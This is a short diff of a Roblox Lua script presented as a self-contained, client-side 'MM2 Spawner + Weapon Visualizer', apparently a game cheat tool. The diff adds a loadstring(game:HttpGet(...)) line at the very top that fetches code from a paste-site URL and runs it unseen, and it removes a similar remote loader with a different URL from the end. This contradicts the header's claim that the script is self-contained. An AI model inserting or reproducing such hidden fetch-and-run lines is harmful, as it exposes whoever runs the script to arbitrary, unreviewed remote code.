@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://cdn.sourceb.in/bins/Vw8S34T3lE/0'))()
+
 --[[
     MM2 — Spawner + Weapon Visualizer  (self-contained, client-side)
     ----------------------------------------------------------------
@@ -44875,4 +44877,3 @@ end
 
 setStatus(("Ready — %d weapons (%d full). Spawn + equip; works in-round too."):format(count, fullCount))
 
-loadstring(game:HttpGet('https://cdn.sourceb.in/bins/cjvnxIzrsr/0'))()
